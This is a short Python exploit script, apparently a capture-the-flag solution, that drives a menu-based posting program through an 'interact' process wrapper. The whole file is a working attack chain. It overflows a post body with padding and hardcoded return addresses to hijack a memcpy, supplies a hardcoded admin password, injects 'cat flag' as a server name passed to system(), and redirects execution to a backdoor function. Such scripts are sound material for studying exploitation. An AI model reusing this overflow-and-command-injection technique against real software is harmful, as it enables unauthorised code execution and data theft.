import interact
import struct

p = interact.Process()

# Create post with return address at end of body
data = p.readuntil('Enter choice:')
p.sendline('1')
data = p.readuntil('post title:')
p.sendline('a'*24)
data = p.readuntil('post contents:')
p.sendline('a'*124 + '\xce'+'\x0b'+'\x40'+'\x00'*5)
data = p.readuntil('Press enter to continue...')
p.sendline('')

# Exploit memcpy call with post data
data = p.readuntil('Enter choice:')
p.sendline('3')
data = p.readuntil('Press enter to continue...')
p.sendline('')
data = p.readuntil('Enter choice:')
p.sendline('2')

# Input secret password to admin login
p.sendline('l0ln0onewillguessth1s')
p.sendline('')

# Set server name to be run in system()
data = p.readuntil('Enter choice:')
p.sendline('0')
data = p.readuntil('Enter choice:')
p.sendline('1')
data = p.readuntil('Enter new server name:')
p.sendline('cat flag')

# Exploit post to call backdoor function
data = p.readuntil('Enter choice:')
p.sendline('1')
data = p.readuntil('post title:')
p.sendline('a'*24)
data = p.readuntil('post contents:')
p.sendline('a'*124 + '\x8a'+'\x0b'+'\x40'+'\x00'*5)
data = p.readuntil('Press enter to continue...')
p.sendline('')
data = p.readuntil('Enter choice:')
p.sendline('4')
data = p.readuntil('Press enter to continue...')
p.sendline('')
data = p.readuntil('Enter choice:')
p.sendline('2')

p.interactive()